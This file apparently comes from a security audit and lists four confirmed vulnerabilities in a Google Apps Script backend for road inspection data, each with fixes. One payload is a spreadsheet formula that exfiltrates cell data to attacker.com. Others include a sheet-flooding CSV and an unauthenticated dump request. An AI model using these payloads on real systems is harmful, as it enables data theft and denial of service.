@@ -1,0 +1,273 @@
+[
+  {
+    "verdict": "confirmed",
+    "title": "Google Sheets Formula Injection in Google Apps Script Backend",
+    "description": "The Google Apps Script backend receives user-submitted CSV records and writes them directly to Google Spreadsheet cells without escaping formula trigger characters (=, +, -, @, \\t, \\r). When an administrator or analyst views the spreadsheet, Google Sheets automatically executes these formulas, enabling exfiltration of all spreadsheet records or phishing attacks within Google Workspace.",
+    "root_cause": "appendRows in gas/Code.gs does not sanitize formula trigger characters (=, +, -, @) before calling setValues, allowing remote formula execution and data exfiltration in Google Sheets",
+    "intended_behavior": "The backend should store pavement inspection records as plain text literals in Google Sheets without allowing formula execution.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "gas/Code.gs",
+        "line": 32,
+        "scope": "doPost",
+        "description": "Receives untrusted CSV payload in HTTP POST request body from external callers."
+      },
+      {
+        "kind": "propagation",
+        "file": "gas/Code.gs",
+        "line": 60,
+        "scope": "doPost",
+        "description": "Parses raw CSV lines into object records without stripping or prefixing formula characters."
+      },
+      {
+        "kind": "sink",
+        "file": "gas/Code.gs",
+        "line": 271,
+        "scope": "appendRows",
+        "description": "Writes unescaped row values directly to Google Spreadsheet cells using setValues()."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "user_interaction",
+        "description": "A spreadsheet owner or authorized user opens or interacts with the Google Sheet containing the injected rows."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Unauthenticated or client-authenticated external actor with network access to the Google Apps Script Web App URL.",
+      "payloads": [
+        "POST https://script.google.com/macros/s/<DEPLOYMENT_ID>/exec?type=sn\nContent-Type: text/plain;charset=utf-8\n\ndate,route,direction,lane,mileage,sn\n2025-01-01,國道1號,南下,外側車道,100,\"=IMPORTXML(CONCAT(\"\"https://attacker.com/leak?data=\"\", JOIN(\"\",\"\", A1:Z100)), \"\"//a\"\")\""
+      ],
+      "instructions": [
+        "1. Send an HTTP POST request to the Google Apps Script endpoint with a CSV body containing a formula payload in any column.",
+        "2. The GAS backend parses the CSV and calls appendRows to persist the rows to the target sheet.",
+        "3. When the spreadsheet is opened by an administrator, Google Sheets evaluates the formula and transmits sensitive cell contents to the external attacker server."
+      ],
+      "expected_result": "The injected formula executes inside Google Sheets, triggering an outbound HTTP request exfiltrating spreadsheet data to the attacker."
+    },
+    "remediation": {
+      "strategy": "Sanitize all cell values before inserting them into Google Sheets by prefixing values starting with =, +, -, @, \\t, or \\r with a single quote character (') or escaping formula triggers.",
+      "code_changes": [
+        {
+          "file_name": "gas/Code.gs",
+          "fixed_code": "function sanitizeCell(val) {\n  if (val === null || val === undefined) return '';\n  var s = String(val);\n  if (/^[=+\\-@\\t\\r]/.test(s)) {\n    return \"'\" + s;\n  }\n  return s;\n}\n\nfunction appendRows(sheetName, headers, records) {\n  const sheet = getOrCreateSheet(sheetName, headers);\n  const rows = records.map(function(r) {\n    return headers.map(function(h) {\n      return sanitizeCell(r[h]);\n    });\n  });\n  if (rows.length > 0) {\n    sheet.getRange(sheet.getLastRow() + 1, 1, rows.length, headers.length).setValues(rows);\n  }\n}"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "high",
+        "reason": "The POST endpoint is accessible over HTTP and accepts arbitrary CSV text without cell-level sanitization."
+      },
+      "impact": {
+        "score": "high",
+        "reason": "Allows exfiltration of all historical road inspection records and credentials/tokens stored in the spreadsheet."
+      },
+      "overall_severity": "high"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Direct code path verified in gas/Code.gs line 271 where setValues is called with unescaped user inputs."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "title": "Uncontrolled Sheet Creation Resource Exhaustion (DoS) in GAS Backend",
+    "description": "The Google Apps Script backend dynamically computes sheet names from user-controlled CSV values (route, direction, lane) and invokes SpreadsheetApp.insertSheet() for every novel sheet name. An attacker can send CSV payloads with hundreds of distinct route or lane names, exhausting Google Sheets cell and sheet limits or exceeding execution timeouts to cause persistent Denial of Service.",
+    "root_cause": "doPost in gas/Code.gs does not validate or limit dynamic sheet name keys before calling getOrCreateSheet, allowing denial of service and spreadsheet quota exhaustion through rapid sheet creation",
+    "intended_behavior": "The backend should validate route, direction, and lane against a strict whitelist of known highways/lanes or enforce a maximum allowed sheet threshold before creating new sheets.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "gas/Code.gs",
+        "line": 32,
+        "scope": "doPost",
+        "description": "Receives CSV upload containing arbitrary user-supplied route, direction, and lane parameters."
+      },
+      {
+        "kind": "propagation",
+        "file": "gas/Code.gs",
+        "line": 88,
+        "scope": "doPost",
+        "description": "Groups rows by dynamic sheet names derived directly from user input via iriSheetName."
+      },
+      {
+        "kind": "sink",
+        "file": "gas/Code.gs",
+        "line": 254,
+        "scope": "getOrCreateSheet",
+        "description": "Calls SpreadsheetApp.insertSheet() to create a new sheet for each unique group without rate limiting or whitelist verification."
+      }
+    ],
+    "conditions": [],
+    "execution": {
+      "attacker_perspective": "External attacker targeting the Google Apps Script Web App.",
+      "payloads": [
+        "POST https://script.google.com/macros/s/<DEPLOYMENT_ID>/exec?type=iri\nContent-Type: text/plain;charset=utf-8\n\ndate,time,route,direction,lane,mileage,avgIri,avgPrqi\n2025-01-01,10:00:00,RouteFlood001,南下,外側車道,100,1.2,1.1\n2025-01-01,10:00:00,RouteFlood002,南下,外側車道,100,1.2,1.1\n..."
+      ],
+      "instructions": [
+        "1. Craft a CSV payload with hundreds of rows where each row contains a distinct route name.",
+        "2. Submit the payload to the doPost endpoint.",
+        "3. Google Apps Script loops through groups and creates dozens/hundreds of new sheets in the Google Spreadsheet, hitting execution time limits and sheet count caps."
+      ],
+      "expected_result": "The target Google Spreadsheet is flooded with bogus worksheets, causing service timeouts and rendering the database unmanageable."
+    },
+    "remediation": {
+      "strategy": "Enforce a strict whitelist of allowed routes, directions, and lanes in doPost, or reject creation of new sheets if the sheet name is not in a pre-approved list.",
+      "code_changes": [
+        {
+          "file_name": "gas/Code.gs",
+          "fixed_code": "var ALLOWED_ROUTES = ['國道1號', '國道3號', '國道4號', '國道5號', '國道6號', '國道8號', '國道10號'];\nvar ALLOWED_DIRECTIONS = ['北上', '南下', '東向', '西向', '順向', '逆向'];\n\nfunction validateRoute(r) {\n  return ALLOWED_ROUTES.indexOf(r) !== -1 ? r : '其他路線';\n}"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "high",
+        "reason": "The endpoint processes CSV batches up to 5,000 records without checking route names against valid highway routes."
+      },
+      "impact": {
+        "score": "medium",
+        "reason": "Leads to spreadsheet corruption, UI clutter, and denial of service for dashboard synchronization."
+      },
+      "overall_severity": "medium"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Confirmed from source in gas/Code.gs lines 85-96 and 250-263."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "title": "Default-Open Authentication Bypass when API_SECRET is Unset",
+    "description": "The authorization function in Google Apps Script is configured to return true if the API_SECRET script property is empty or undefined. This fail-open design means that any new deployment or misconfigured instance of the backend leaves all read and write APIs completely unauthenticated.",
+    "root_cause": "isAuthorized in gas/Code.gs does not reject requests when API_SECRET is empty or unconfigured, allowing unauthenticated attackers to read and write database records",
+    "intended_behavior": "The backend should fail closed: if API_SECRET is not configured or is empty, all API operations must be rejected with an Unauthorized error.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "gas/Code.gs",
+        "line": 34,
+        "scope": "doPost",
+        "description": "Receives incoming API request and invokes isAuthorized(e)."
+      },
+      {
+        "kind": "sink",
+        "file": "gas/Code.gs",
+        "line": 17,
+        "scope": "isAuthorized",
+        "description": "Returns true when API_SECRET is empty or unset, bypassing authorization checks entirely."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "system_configuration",
+        "description": "API_SECRET is not explicitly configured in Google Apps Script ScriptProperties."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Unauthenticated remote attacker.",
+      "payloads": [
+        "GET https://script.google.com/macros/s/<DEPLOYMENT_ID>/exec?type=all"
+      ],
+      "instructions": [
+        "1. Send a GET request to /exec?type=all without providing any key parameter.",
+        "2. If the deployment has not initialized API_SECRET, isAuthorized returns true and dumps the entire spreadsheet database."
+      ],
+      "expected_result": "The server returns the full database content without requiring authentication."
+    },
+    "remediation": {
+      "strategy": "Implement fail-closed authentication logic where missing or empty API_SECRET causes isAuthorized to return false.",
+      "code_changes": [
+        {
+          "file_name": "gas/Code.gs",
+          "fixed_code": "function isAuthorized(e) {\n  if (!API_SECRET || API_SECRET.trim().length === 0) {\n    console.error('API_SECRET is not configured in ScriptProperties');\n    return false;\n  }\n  return e && e.parameter && e.parameter.key === API_SECRET;\n}"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Common during initial deployment or migration phases before ScriptProperties are populated."
+      },
+      "impact": {
+        "score": "high",
+        "reason": "Grants full unauthenticated read and write access to the entire Google Sheets database."
+      },
+      "overall_severity": "medium"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Explicit code check in gas/Code.gs line 17: if (!API_SECRET) return true;"
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "title": "Client-Side Secret Embedding and Ineffective Backend Authentication Architecture",
+    "description": "The application architecture relies on a shared secret (VITE_GAS_API_KEY / GEMINI_API_KEY) embedded into the client-side Single Page Application bundle and transmitted in URL query parameters. Because client-side code is completely accessible to all end users, this secret cannot provide access control or prevent unauthorized database modifications.",
+    "root_cause": "buildUrl in src/lib/gasService.ts does not protect the shared API key within a secure backend proxy, allowing public users to extract the key from client bundles and make unauthorized backend requests",
+    "intended_behavior": "Sensitive backend services should be proxied through an authenticated server-side API or use user-based OAuth authentication rather than embedding static secrets in browser client bundles.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "src/lib/gasService.ts",
+        "line": 8,
+        "scope": "gasService",
+        "description": "Imports VITE_GAS_API_KEY from Vite client environment variables into client runtime."
+      },
+      {
+        "kind": "propagation",
+        "file": "src/lib/gasService.ts",
+        "line": 13,
+        "scope": "buildUrl",
+        "description": "Appends the secret key as a URL search parameter ?key=... to all outbound requests."
+      },
+      {
+        "kind": "sink",
+        "file": "src/lib/gasService.ts",
+        "line": 40,
+        "scope": "postCsv",
+        "description": "Transmits the secret key over browser network requests, exposing it to any client inspecting the page."
+      }
+    ],
+    "conditions": [],
+    "execution": {
+      "attacker_perspective": "Any website visitor or user with browser access.",
+      "payloads": [
+        "Inspect Network tab in DevTools or grep for 'key=' / 'de9117485c' in dist/assets/*.js"
+      ],
+      "instructions": [
+        "1. Open the web application in any browser.",
+        "2. Open Developer Tools (F12) and inspect the Network requests or the compiled JavaScript bundle.",
+        "3. Extract the VITE_GAS_API_KEY and VITE_GAS_URL.",
+        "4. Use the extracted key to perform direct API calls against Google Apps Script without using the web UI."
+      ],
+      "expected_result": "The attacker obtains the static API key and gains direct read/write API access to the database."
+    },
+    "remediation": {
+      "strategy": "Do not treat client-embedded keys as secrets. If access control is required, implement Google Workspace OAuth login (e.g. Google Sign-In) or route requests through a dedicated backend API with user authentication.",
+      "code_changes": [
+        {
+          "file_name": "src/lib/gasService.ts",
+          "fixed_code": "// Replace static secret parameter with OAuth Bearer token or backend session auth\nfunction buildUrl(base: string, params: Record<string, string> = {}): string {\n  const u = new URL(base);\n  Object.entries(params).forEach(([k, v]) => u.searchParams.set(k, v));\n  return u.toString();\n}"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "high",
+        "reason": "Client-side bundles on GitHub Pages are completely public and trivial to inspect."
+      },
+      "impact": {
+        "score": "medium",
+        "reason": "Nullifies the security provided by API_SECRET, rendering the backend effectively unauthenticated to any motivated client."
+      },
+      "overall_severity": "medium"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Verified in src/lib/gasService.ts line 8 and .env.example line 6."
+    }
+  }
+]
